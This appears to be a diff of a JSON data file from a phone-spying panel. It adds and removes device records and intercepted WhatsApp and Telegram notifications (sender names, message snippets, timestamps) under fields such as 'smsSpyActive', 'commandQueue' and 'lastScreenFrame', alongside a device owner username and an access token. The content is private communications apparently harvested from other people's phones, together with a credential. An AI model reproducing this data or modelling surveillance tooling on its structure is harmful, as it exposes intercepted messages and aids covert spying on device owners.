@@ -6331,6 +6331,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎3674 pesan dari 23 chat",
+        "time": "21/04 19:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775045754
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎7Sex Message (216 pesan): ~ no",
         "content": ".x",
         "time": "21/04 19:37",
@@ -10320,14 +10328,6 @@
         "time": "21/04 19:12",
         "pkg": "com.whatsapp",
         "receivedAt": 1776773564238
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "‎7Sex Message (177 pesan): ~ Aufatzy",
-        "content": ".jadibot",
-        "time": "21/04 19:12",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776773564200
       }
     ],
     "galleryPhotos": [],
@@ -10346,7 +10346,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776775042874,
+    "lastSeen": 1776775045882,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -10403,6 +10403,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "[ suendi ]",
+        "content": "Pesan baru dari 1 chat",
+        "time": "21/04 19:37",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776775046902
+      },
       {
         "appName": "Telegram",
         "sender": "GB PUBLIC FREE PANEL: メ ɴᴀғᴢx メ ᴘʀᴏᴛᴇᴄᴛ ᴘᴀɴᴇʟ",
@@ -14394,14 +14402,6 @@
         "time": "21/04 18:52",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776772361042
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "❄️ Akun Terhapuss・16625 pesan baru dari 115 obrolan",
-        "time": "21/04 18:52",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776772361015
       }
     ],
     "galleryPhotos": [],
